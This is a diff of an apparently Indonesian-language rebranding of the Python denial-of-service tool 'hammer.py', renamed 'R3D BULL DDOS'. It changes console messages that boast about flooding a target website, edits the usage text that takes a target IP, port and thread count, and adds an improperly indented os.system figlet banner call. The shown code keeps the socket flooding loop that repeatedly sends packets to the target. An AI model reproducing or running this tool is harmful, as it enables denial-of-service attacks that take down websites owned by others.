@@ -8,7 +8,7 @@
 
 from queue import Queue
 from optparse import OptionParser
-import time,sys,socket,threading,logging,urllib.request,random
+import time,sys,os,socket,threading,logging,urllib.request,random
 
 def user_agent():
 	global uagent
@@ -49,13 +49,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m Webnya sedang sedang dikeroyok...! \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->kena gebukin\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mno connection! websitenya sudah bonyok\033[0m")
+		print("\033[91mBagus websitenya sudah bonyok\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -75,14 +75,15 @@ def dos2():
 
 
 def usage():
+os.system('figlet -f "R3D BULL" -F gay')
 	print (''' \033[92m	Gebukin tool. dibuat oleh R3D BULL
 	BAR²
 	Ini untuk gebukin web
-	ketik : python3 hammer.py [-s] [-p] [-t]
+	ketik : python3 R3D BULL DDOS.py [-s] [-p] [-t]
 	-h : help
-	-s : server ip
-	-p : port default 80
-	-t : turbo default 135 \033[0m''')
+	-s : ip web
+	-p : portnya 80 aja ya :V,atau terserah kalian
+	-t : turbo nya tulis aja 135 \033[0m''')
 	sys.exit()
 
 
